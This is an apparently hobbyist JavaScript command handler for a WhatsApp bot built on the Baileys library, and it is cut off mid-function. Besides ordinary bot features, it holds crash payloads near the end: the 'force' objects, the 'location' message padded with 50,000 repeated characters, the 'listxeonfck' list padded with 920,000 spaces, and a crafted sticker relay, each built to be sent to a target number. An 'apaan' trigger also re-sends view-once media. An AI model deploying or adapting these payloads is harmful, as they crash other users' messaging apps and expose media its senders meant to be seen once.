/*
    
     #(Developer) = SkyZet
     #(Type) = Case
        
 ≼≽ Dont Forget To Subscribe Our Channel:
    - https://whatsapp.com/channel/0029Val4Foo4tRrsaZ5jWz09
    
 Ingin Membeli Kebutuhan Bot?
⸙ Contact Developer: 62857888108676

*/
require('./config')
require('./function/menu')
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const cheerio = require('cheerio')
const path = require('path')
const chalk = require("chalk");
const ms = require("ms");
const { randomBytes } = require('crypto') 
const { performance } = require("perf_hooks");
const FormData = require('form-data')
const process = require('process');
const os = require('os');
const { Deobfuscator } = require("deobfuscator");
const moment = require('moment-timezone')
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const ytdl = require('ytdl-core')
const crypto = require('crypto')
const createHash = require('crypto');
const QRCode = require('qrcode');
const yts = require ('yt-search');
const canvacord = require("canvacord")
const PhoneNumber = require('awesome-phonenumber')

const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);

module.exports = ZetInc = async (ZetInc, m, chatUpdate, store, isSetWelcome, jid, fromMe, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left) => {
const { mtype } = m
const isGroup = m.chat.endsWith('@g.us')
const type = getContentType(m.message);
const remoteJid = m.key.remoteJid
const content = JSON.stringify(m.message);
const sender = m.key.fromMe
    ? ZetInc.user.id.split(":")[0] + "@s.whatsapp.net" || ZetInc.user.id
    : m.key.participant || m.key.remoteJid;
try {
const body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype === "imageMessage"
          ? m.message.imageMessage.caption
          : m.mtype === "videoMessage"
            ? m.message.videoMessage.caption
            : m.mtype === "extendedTextMessage"
              ? m.message.extendedTextMessage.text
              : m.mtype === "buttonsResponseMessage"
                ? m.message.buttonsResponseMessage.selectedButtonId
                : m.mtype === "listResponseMessage"
                  ? m.message.listResponseMessage.singleSelectReply
                      .selectedRowId
                  : m.mtype === "templateButtonReplyMessage"
                    ? m.message.templateButtonReplyMessage.selectedId
                    : m.mtype === "interactiveResponseMessage"
                      ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)
                          .id
                      : m.mtype === "templateButtonReplyMessage"
                        ? m.msg.selectedId
                        : m.mtype === "messageContextInfo"
                          ? m.message.buttonsResponseMessage
                              ?.selectedButtonId ||
                            m.message.listResponseMessage?.singleSelectReply
                              .selectedRowId ||
                            m.text
                          : "";

const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
const pendaftar = JSON.parse(fs.readFileSync('./lib/database/pendaftar.json'))
const set_welcome_db = JSON.parse(fs.readFileSync('./lib/database/set_welcome.json'));
const _cmd = JSON.parse(fs.readFileSync('./lib/database/command.json'));
const _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json')); 
const user_ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const orgkaya = JSON.parse(fs.readFileSync('./database/premium.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));

//LIB
const { Blackbox } = require('./lib/blackbox')
const { bard } = require('./lib/bard')
const { jadianime } = require('./lib/toanime')
const { geminii } = require ('./lib/gemini.js')
const { chatWithGPT } = require('./lib/azure')
const { tiktoks } = require('./lib/tiktoks')
const { igdl2 } = require('./lib/igdl')
const { Saweria } = require('./lib/saweria')
const { searching, spotifydl } = require("./lib/spotify");
const { BingImageCreator } = require("./lib/bingimg");
const { whisper } = require('./lib/whisper')
const { bestimChat } = require('./lib/bestimChat')
const { Animedif } = require('./lib/animedif')
const { yousearch } = require('./lib/yousearch')
const { postData } = require('./lib/aoyo')
const { thinkany } = require('./lib/thinkany')
const { Telesticker } = require('./lib/Tele')
const { spotifydll, searchSpotify } = require('./lib/spotifyy')
const { leptonAi } = require('./lib/leptonai')
const { ytdlnew } = require('./lib/ytdlnew')
const _prem = require('./lib/premium')
const { animagine } = require('./lib/animagine')
const tictactoe = require("./lib/tictactoe")
const { voiceRecognition } = require("./lib/totext")
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premium')
const { bytesToSize, checkBandwidth, getRandom, sleep, smsg, formatSize, serialize, fetchJson,  getBuffer, isUrl, jsonformat, msToDay, msToDate, generateProfilePicture, nganuin, toRupiah, pickRandom, randomInt, runtime, shorturl, formatp, parseMention, clockString, color, getGroupAdmins, msToTime, msToMinute, msToHour, msToSecond } = require("./function/myfunc");
const { addExif, addExifAvatar } = require('./lib/exif')
const { search, ytmp3 } = require('./lib/searchyt')
const { addInvDeposit, getInvDeposit, checkInvDeposit, _addSaldo, kurangSaldo, getSaldo } = require("./lib/deposit");
const { TelegraPH } = require("./lib/TelegraPH")
const { addCountCmd, getPosiCmdUser, addCountCmdUser } = require('./function/command')
const { tiktokslide, searchSpotifyTracks, mediafire, igdl, realistic, findSongs, remini, capcut, livecharttba, chat, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { afk } = require("./lib/afk")
let Button = require("./function/button");
let btn = new Button();
    
const autoReadMessage = global.Auto_ReadPesan;
    
var budy = typeof m.text == "string" ? m.text : "";
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)[0] : '': prefa
/*const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()*/               
const isCmd = body.startsWith(prefix)
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const pushname = m.pushName || "No Name"
const nomore = m.sender.replace(/[^0-9]/g, '')
const botNumber = await ZetInc.decodeJid(ZetInc.user.id);
const senderJid = m.key.fromMe ? ZetInc.user.id.split(':')[0] + '@s.whatsapp.net' || ZetInc.user.id : m.key.participant || m.key.remoteJid
const senderId = senderJid.split('@')[0]
const isCreator = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCommand = isCmd ? budy.slice(1).trim().split(' ').shift().toLowerCase() : ""

const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
    
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const itsMe = m.sender == botNumber ? true : false
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const mentionedJid = [m.sender]
const isUser = pendaftar.includes(m.sender)
const text = q = args.join(" ");
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const toJSON = j => JSON.stringify(j, null,'\t')
const from = m.key.remoteJid
const fatkuns = m && (m.quoted || m);
    const quoted =
      fatkuns?.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns?.mtype == "templateMessage"
          ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
          : fatkuns?.mtype == "product"
            ? fatkuns[Object.keys(fatkuns)[0]]
            : m.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const settings = global.db.data.settings
const isMedia = /image|video|sticker|audio/.test(mime);

const isSticker = (type == 'stickerMessage')
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
//const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

// Group
const groupMetadata = m?.isGroup ? await ZetInc.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'));
const isBan = user_ban.includes(m.sender)    
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false

const menunya = fs.readFileSync('./lib/thumbnail/zThumbX.jpg')
const fakejpg = fs.readFileSync(`./lib/thumbnail/bruhhh.jpg`)
let verify = JSON.parse(fs.readFileSync('./lib/verify.json', 'utf-8'))
    
const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, orgkaya); 
const moment = require('moment-timezone');
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
    
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { getTextSetWelcome } = require('./lib/setwelcome')
const { getTextSetLeft } = require('./lib/setleft');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');


if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}
    
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 ${ucapanWaktu} 💫`))
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Pesan Baru`))
    console.log(chalk.black.bgHex("#00FF00")(`📅 Tanggal: ${new Date().toLocaleString()} \n💬 Pesan: ${m.body || m.mtype} \n🗣️ Pengirim: ${m.pushName} \n🔢 JID: ${m.sender}`))
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`))
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`))
    }
    //await sleep(1000)
    //await console.log(JSON.stringify(m.message))
}
    
    
const loadPlugins = (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(folder => {
const folderPath = path.join(directory, folder)
if (fs.lstatSync(folderPath).isDirectory()) {
const files = fs.readdirSync(folderPath)
files.forEach(file => {
const filePath = path.join(folderPath, file)
if (filePath.endsWith(".js")) {
try {
delete require.cache[require.resolve(filePath)]
const plugin = require(filePath)
plugin.filePath = filePath
plugins.push(plugin)
} catch (error) {
console.error(`Error loading plugin at ${filePath}:`, error)
}}})
}})
return plugins
}

const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
const context = { ZetInc, m, chatUpdate, store, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, reply, q, command, prefix, args, sender, quoted }
let handled = false
for (const plugin of plugins) {
if (plugin.command.includes(command)) {
try {
await plugin.operate(context)
handled = true
} catch (error) {
console.error(`Error executing plugin ${plugin.filePath}:`, error)
}
break
}
}
     
function formatter(value) {
  return value.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}

function calculatePPN(value) {
  return value * 0.1;
}

function removeItem(array, item) {
  return array.filter(elem => !(elem.jid === item.jid && elem.state === item.state));
}
/*    
const pickRandom = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)]
}*/

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


if (!ZetInc.public) {
if (!m.key.fromMe) return
}
    
if (autoread) {
ZetInc.readMessages([m.key])
}
    
if (global.autoTyping) {
if (command) {
ZetInc.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
ZetInc.sendPresenceUpdate('recording', from)
}
}
    
async function getRandomInt(min, max) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const zetTH = ["https://telegra.ph/file/0bf7f99fb65873896e22d.jpg"]
 const iconicZet = ["https://telegra.ph/file/beb4a186c76a15b2deb7b.jpg"]

const zlogo1 = fs.readFileSync(`./image/ZetLogo/zlogo1.jpg`)
 const zlogo2 = fs.readFileSync(`./image/ZetLogo/zlogo2.jpg`)
      const logoz = [zlogo1, zlogo2]
      const zLogo = logoz[Math.floor(Math.random() * logoz.length)]

 const zetsQuoted = fs.readFileSync(`./image/ZetLogo/zQuoted.jpg`)
    
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/thumbnail/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
    
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/thumbnail/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//

let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
    
const fkontak = {
key: {
participants: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
fromMe: false,
id: "Halo"},
message: {
contactMessage: {
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
}},
participant: "0@s.whatsapp.net"
}

const fake = {
key: {
participant: '0@s.whatsapp.net',
remoteJid: "0@s.whatsapp.net"},
message: {
extendedTextMessage: {
text: `ᣝ SkyZ..`,
title: "—CzA",
thumbnailUrl: zetTH
}}}


const instrumen = {
key: {
remoteJid: "0@s.whatsapp.net",
participant: "0@s.whatsapp.net",
id: "",
},
message: {
conversation: `*audio instrumen*`,
}};
    
const vocal = {
key: {
remoteJid: "0@s.whatsapp.net",
participant: "0@s.whatsapp.net",
id: "",
},
message: {
conversation: `*audio vocal*`,
}};

const tes = {
key: {
participant: '0@s.whatsapp.net',
remoteJid: "0@s.whatsapp.net"},
message: {
extendedTextMessage: {
text: '⎋ 𝗞𝗻𝗶𝗴𝗵𝘁𝗭͢𝗲𝘁ᤩ',
title: "—Bot Assistent",
thumbnailUrl: zetTH
}}}

const ments = (testt) => {
const regex = /@([0-9]{5,16}|0)/g;
const matches = [];
let match;
  
  while ((match = regex.exec(testt)) !== null) {
    matches.push(match[1] + '@s.whatsapp.net');
  }
  
  return matches.length > 0 ? matches : [sender];
};

const zets = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2024",
      thumbnail: zetsQuoted,
      itemCount: `2024`,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `⟡ ${m.body}͢`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 99999,
    isForwarded: true
  }
}

const zreply = async (teks) => {
 return ZetInc.sendMessage(m.chat, {
  contextInfo: {
  mentionedJid: [m.sender],
   externalAdReply: {
     showAdAttribution: false,
      renderLargerThumbnail: false,
        title: `⎋ 𝗞𝗻𝗶𝗴𝗵𝘁𝗭͢𝗲𝘁ᤩ`,
        body: `—Bot Assistent`,
        previewType: "VIDEO",
            thumbnail: zLogo,
            sourceUrl: 'https://google.com',
            mediaUrl: 'https://google.com'
            }}, text: teks }, { quoted: zets })
            }

async function reply(testt) {
const mentionedJids = await ments(testt);
ZetInc.sendMessage(m.chat, {
text: testt,
contextInfo: {
mentionedJid: mentionedJids,
externalAdReply: {
title: "© KyuuRzy - Client",
body: "By KyuuSenpaiii",
thumbnailUrl: global.thumbnail,
sourceUrl: 'https://google.com/',
renderLargerThumbnail: false,
}}}, { quoted: m })}
  
if (budy.match(`🗿`)) {
ZetInc.sendReact(m.chat, `🗿`, m.key);
}
    
if (budy.match(`🗿🗿`)) {
ZetInc.sendReact(m.chat, `🗿`, m.key);
}
    
if (budy.match(`🗿🗿🗿`)) {
ZetInc.sendReact(m.chat, `🗿`, m.key);
}
    
if (budy.match(`@6281351692548`)) {
ZetInc.sendReact(m.chat, `😒`, m.key);
}
    
if (budy.match(`Kyuu`)) {
ZetInc.sendReact(m.chat, `😡`, m.key);
}
    
if (budy.match(`kyuu`)) {
ZetInc.sendReact(m.chat, `😡`, m.key);
}
    
if (budy.match(`KyuuRzy`)) {
ZetInc.sendReact(m.chat, `😡`, m.key);
}
    
if (budy.match(`kyuurzy`)) {
ZetInc.sendReact(m.chat, `😡`, m.key);
}
    
if (budy.match(`@6281228599963`)) {
ZetInc.sendReact(m.chat, `😂`, m.key);
}
    
if (budy.match(`ghost`)) {
ZetInc.sendReact(m.chat, `🛐`, m.key);
}
    
if (budy.match(`Ghost`)) {
ZetInc.sendReact(m.chat, `😮`, m.key);
}

if (budy.match(`apaan`)) {
//if (!m.quoted) return zreply("Reply gambar/video yang ingin Anda lihat");
//if (m.quoted.mtype !== "viewOnceMessageV2") return zreply("Ini bukan pesan view-once.");
let msg = m.quoted.message;
let type = Object.keys(msg)[0];
let media = await downloadContentFromMessage(
msg[type],
type == "imageMessage" ? "image" : "video",
);
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (/video/.test(type)) {
return ZetInc.sendFile(
m.chat,
buffer,
"media.mp4",
msg[type].caption || "",
m,
);
} else if (/image/.test(type)) {
return ZetInc.sendFile(
m.chat,
buffer,
"media.jpg",
msg[type].caption || "",
m,
);
}}
    
 
ZetInc.sendUrlTele = async (jid, title, footer , title1, btn, m, options = {}) => {
let msg = generateWAMessageFromContent(jid, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
    mentionedJid: [sender],
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363295825562726@newsletter',
			newsletterName: 'Powered By </XcodeKyuu', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ZetInc.decodeJid(ZetInc.user.id) },
 externalAdReply: { 
 title: 'KyuuRzy', 
 thumbnailUrl: `${global.thumbnail}`, 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: title
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: footer
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: title1,
 subtitle: "",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"${tele}\",\"merchant_url\":\"${tele}\"}`
},
]
 })
 })
 }
 }
}, { userJid: jid, quoted: fake })

await ZetInc.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}

async function replysc(tesku) {
ZetInc.sendUrlTele(m.chat, tesku, `— kyuucoders.`)
}
    
async function Decrypt(query) {
  const deobfuscatedCode = new Deobfuscator();
  return deobfuscatedCode.deobfuscateSource(query);
}
    
const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": `🌠 ${global.botname} Project`,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `KyuuRzy icikiwir`
}
}
}

function getTodayDate() {
  const today = new Date();

  const day = today.getDate();
  const month = today.getMonth() + 1; // Perhatikan bahwa bulan dimulai dari 0, maka ditambahkan 1.
  const year = today.getFullYear();
  const dayOfWeek = today.toLocaleDateString("id-ID", { weekday: "long" }); // Mengambil nama hari dalam bahasa Inggris.

  return `Hari ini adalah ${dayOfWeek}, ${day}/${month}/${year}.`;
}
    
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function location(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ZetInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "K-Tech"+" ".repeat(920000),
        'footerText': `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`,
        'description': `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
